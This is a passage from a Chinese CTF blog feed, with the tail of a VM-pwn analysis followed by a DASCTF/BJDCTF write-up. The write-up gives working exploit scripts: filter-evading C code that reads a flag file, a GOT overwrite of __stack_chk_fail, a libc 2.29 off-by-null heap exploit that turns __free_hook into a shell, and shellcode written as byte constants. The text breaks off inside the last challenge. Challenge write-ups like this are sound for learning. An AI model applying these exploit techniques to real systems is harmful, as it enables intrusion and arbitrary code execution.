punctuation">)</span>          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v8 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v9 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">></span> <span class="token number">7u</span> <span class="token operator">||</span> v9 <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span>          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x5C</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x58</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v10<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>vm结构体如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    uint64_t r0<span class="token punctuation">;</span>    uint64_t r1<span class="token punctuation">;</span>    uint64_t r2<span class="token punctuation">;</span>    uint64_t r3<span class="token punctuation">;</span>    uint64_t r4<span class="token punctuation">;</span>    uint64_t r5<span class="token punctuation">;</span>    uint64_t r6<span class="token punctuation">;</span>    uint64_t r7<span class="token punctuation">;</span>    uint64_t<span class="token operator">*</span> rsp<span class="token punctuation">;</span>    uint64_t<span class="token operator">*</span> rbp<span class="token punctuation">;</span>    uint8_t<span class="token operator">*</span> pc<span class="token punctuation">;</span>    uint32_t stack_size<span class="token punctuation">;</span>    uint32_t stack_cap<span class="token punctuation">;</span><span class="token punctuation">}</span>vm<span class="token punctuation">;</span></code></pre><p>分析完check，我们知道寄存器的范围被限定了，不允许我们越界读写，但其中的jmp功能并没有做任何check，而且在vm_start函数中，先分配的pc段，再分配的stack段，stack段在高地址，两个段分别是两个chunk，chunk之间因为presize的存在会有一段空字符，因此这个check函数其实只检查了PC段，stack段是没有做任何检查的。因此我们可以将先将code压入栈中，然后再跳到栈中执行，这样就没有check了。</p><p>暂且就分析这些，exp就看ruan师傅的吧，我这里将所有的函数和指令都分析一遍，这样无论是自己复现还是调试别人的exp也应该不会一脸懵逼了，调试起来会快一些。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>复现几题vmpwn之后感觉人都变佛系了许多，逆向指令十分考研耐心和细心，最好是一边分析一边做注释，慢一点也没关系，以免因代码量太大，分析完之后再回头看又不知道是什么了。</p><p>参考链接:</p><p><a href="https://www.anquanke.com/post/id/199832" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199832</a></p><p><a href="https://ruan777.github.io/2020/06/01/RCTF2020部分题解_ch/" target="_blank" rel="noopener">https://ruan777.github.io/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;新手向，会讲得比较详细，入门不易&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://lawliet.ren/categories/CTF/"/>
    
    
      <category term="PWN" scheme="https://lawliet.ren/tags/PWN/"/>
    
      <category term="逆向" scheme="https://lawliet.ren/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF五月赛&amp;BJDCTF</title>
    <link href="https://lawliet.ren/2020/05/24/dasctf-wu-yue-sai-bjdctf/"/>
    <id>https://lawliet.ren/2020/05/24/dasctf-wu-yue-sai-bjdctf/</id>
    <published>2020-05-24T06:41:11.000Z</published>
    <updated>2020-07-30T04:53:29.557Z</updated>
    
    <content type="html"><![CDATA[<p>菜鸡打比赛就是兴致满满打开网站—&gt;下载附件，拖入IDA—&gt;F5，眉头紧锁，冷静分析—&gt;关闭网站，打开游戏，ctf什么的见鬼去吧</p><p>这次安恒月赛和bjdctf3rd梦幻联动，本着凑热闹的心态去打了一波，总共八个pwn，做了四个。。。艹，太菜了，下面记录并复现一下这次的赛题</p><a id="more"></a><h2 id="0x1-OJ0"><a href="#0x1-OJ0" class="headerlink" title="0x1.OJ0"></a>0x1.OJ0</h2><p>这题没有附件，是个c语言编译器，能够编译并且执行我们输入的c代码，所以我们需要通过输入c代码来拿到flag，测试之后发现system被禁，然后想用orw读flag，flag这个词也被禁，所以需要拼接，但还是读不出来，后来经提醒，flag的目录为/home/ctf/flag，继续读取，发现这个路径也被禁了，于是继续拼接，成功读取，exp如下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> file<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token string">"/ho"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token string">"me/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token string">"ct"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token string">"f/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token string">"fl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token string">"ag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>s<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="0x2-Memory-Monster-I"><a href="#0x2-Memory-Monster-I" class="headerlink" title="0x2.Memory_Monster_I"></a>0x2.Memory_Monster_I</h2><p>这题是任意地址写，并没有exit函数，加上程序开启了canary，所以考虑修改__stack_chk_fail函数为程序中的后门函数，这样栈溢出就会执行后门函数，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io=process('./Memory_Monster_I')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'183.129.189.60'</span><span class="token punctuation">,</span><span class="token number">10081</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'Memory_Monster_I'</span><span class="token punctuation">)</span>__stack_chk_fail_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>__stack_chk_fail_got<span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'addr:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0x40124a</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'data:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x3-happending"><a href="#0x3-happending" class="headerlink" title="0x3.happending"></a>0x3.happending</h2><p>libc2.29的off-by-null，利用起来限制要多很多，而且这个题目存在off-by-null的功能还是add，难度就更大了，不过所谓前人栽树后人乘凉，有大师傅已经把利用方式总结好了，<a href="https://bbs.pediy.com/thread-257901.htm" target="_blank" rel="noopener">参考链接</a>,我就不做讲解了，直接贴exp了</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 0-6</span>        add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">"padding"</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token operator">-</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">"padding"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 7</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 8-14</span>        add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0xb20</span><span class="token punctuation">,</span> <span class="token string">"largebin"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 15</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"padding"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 16</span>    delete<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># chunk15 to largebin</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x521</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 18</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 19</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 20</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 21</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 8-14</span>        delete<span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 8-14</span>        add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 18</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span>  p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(io)</span>    <span class="token comment" spellcheck="true"># gdb.attach(io)</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'clear'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 21</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 8-14</span>        delete<span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 8-14</span>        add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p8<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">"clear"</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 23 overwrite</span>    add<span class="token punctuation">(</span><span class="token number">0x5f8</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 24 trigger off-by-null</span>    add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 25</span>    delete<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x520</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#24</span>    show<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1e4ca0</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    free_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>    system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(io)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#io=process('./x')</span>            io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'183.129.189.60'</span><span class="token punctuation">,</span><span class="token number">10108</span><span class="token punctuation">)</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x4-OJ1"><a href="#0x4-OJ1" class="headerlink" title="0x4.OJ1"></a>0x4.OJ1</h2><p>同样是c语言编译器，不过这题不允许出现括号，包括&lt;&gt;,(),{}，所以正常用c语言肯定不行，这种情况下有一种利用方式，就是将汇编语言的字节码作为输入，如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">char</span> main <span class="token operator">=</span> <span class="token number">0x55</span><span class="token punctuation">,</span> main1 <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">,</span> main2 <span class="token operator">=</span> <span class="token number">0x89</span><span class="token punctuation">,</span> main3 <span class="token operator">=</span> <span class="token number">0xe5</span><span class="token punctuation">,</span> main4 <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">,</span>           main5 <span class="token operator">=</span> <span class="token number">0x83</span><span class="token punctuation">,</span> main6 <span class="token operator">=</span> <span class="token number">0xec</span><span class="token punctuation">,</span> main7 <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">,</span> main8 <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">,</span> main9 <span class="token operator">=</span> <span class="token number">0xb8</span><span class="token punctuation">,</span>           main10 <span class="token operator">=</span> <span class="token number">0x63</span><span class="token punctuation">,</span> main11 <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">,</span> main12 <span class="token operator">=</span> <span class="token number">0x74</span><span class="token punctuation">,</span> main13 <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">,</span>           main14 <span class="token operator">=</span> <span class="token number">0x2f</span><span class="token punctuation">,</span> main15 <span class="token operator">=</span> <span class="token number">0x68</span><span class="token punctuation">,</span> main16 <span class="token operator">=</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> main17 <span class="token operator">=</span> <span class="token number">0x6d</span><span class="token punctuation">,</span>           main18 <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">,</span> main19 <span class="token operator">=</span> <span class="token number">0x89</span><span class="token punctuation">,</span> main20 <span class="token operator">=</span> <span class="token number">0x45</span><span class="token punctuation">,</span> main21 <span class="token operator">=</span> <span class="token number">0xe0</span><span class="token punctuation">,</span>           main22 <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">,</span> main23 <span class="token operator">=</span> <span class="token number">0xb8</span><span class="token punctuation">,</span> main24 <span class="token operator">=</span> <span class="token number">0x65</span><span class="token punctuation">,</span> main25 <span class="token operator">=</span> <span class="token number">0x2f</span><span class="token punctuation">,</span>       main26 <span class="token operator">=</span> <span class="token number">0x63</span><span class="token punctuation">,</span>main27 <span class="token operator">=</span> <span class="token number">0x74</span><span class="token punctuation">,</span>main28 <span class="token operator">=</span> <span class="token number">0x66</span><span class="token punctuation">,</span>main29 <span class="token operator">=</span> <span class="token number">0x2f</span><span class="token punctuation">,</span>       main30 <span class="token operator">=</span> <span class="token number">0x66</span><span class="token punctuation">,</span>main31 <span class="token operator">=</span> <span class="token number">0x6c</span><span class="token punctuation">,</span>main32 <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">,</span>main33 <span class="token operator">=</span> <span class="token number">0x89</span><span class="token punctuation">,</span>main34 <span class="token operator">=</span> <span class="token number">0x45</span><span class="token punctuation">,</span>       main35 <span class="token operator">=</span> <span class="token number">0xe8</span><span class="token punctuation">,</span>main36 <span class="token operator">=</span> <span class="token number">0x66</span><span class="token punctuation">,</span>main37 <span class="token operator">=</span> <span class="token number">0xc7</span><span class="token punctuation">,</span>main38 <span class="token operator">=</span> <span class="token number">0x45</span><span class="token punctuation">,</span>main39 <span class="token operator">=</span> <span class="token number">0xf0</span><span class="token punctuation">,</span>       main40 <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">,</span>main41 <span class="token operator">=</span> <span class="token number">0x67</span><span class="token punctuation">,</span>main20 <span class="token operator">=</span> <span class="token number">0xc6</span><span class="token punctuation">,</span>main21 <span class="token operator">=</span> <span class="token number">0x45</span><span class="token punctuation">,</span>main22 <span class="token operator">=</span> <span class="token number">0xf2</span><span class="token punctuation">,</span>       main23 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>main24 <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">,</span>main25 <span class="token operator">=</span> <span class="token number">0x8d</span><span class="token punctuation">,</span>main26 <span class="token operator">=</span> <span class="token number">0x45</span><span class="token punctuation">,</span>main27 <span class="token operator">=</span> <span class="token number">0xe0</span><span class="token punctuation">,</span>       main28 <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">,</span>main29 <span class="token operator">=</span> <span class="token number">0x89</span><span class="token punctuation">,</span>main30 <span class="token operator">=</span> <span class="token number">0xc7</span><span class="token punctuation">,</span>main31 <span class="token operator">=</span> <span class="token number">0xe8</span><span class="token punctuation">,</span>main32 <span class="token operator">=</span> <span class="token number">0xa0</span><span class="token punctuation">,</span>       main33 <span class="token operator">=</span> <span class="token number">0xfe</span><span class="token punctuation">,</span>main34 <span class="token operator">=</span> <span class="token number">0xff</span><span class="token punctuation">,</span>main35 <span class="token operator">=</span> <span class="token number">0xff</span><span class="token punctuation">,</span>main36 <span class="token operator">=</span> <span class="token number">0xb8</span><span class="token punctuation">,</span>main37 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>       main38 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>main39 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>main40 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>main41 <span class="token operator">=</span> <span class="token number">0xc9</span><span class="token punctuation">,</span>main42 <span class="token operator">=</span> <span class="token number">0xc3</span><span class="token punctuation">;</span>@</code></pre><p>这以坨代码变成c代码如下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> rce<span class="token punctuation">[</span><span class="token 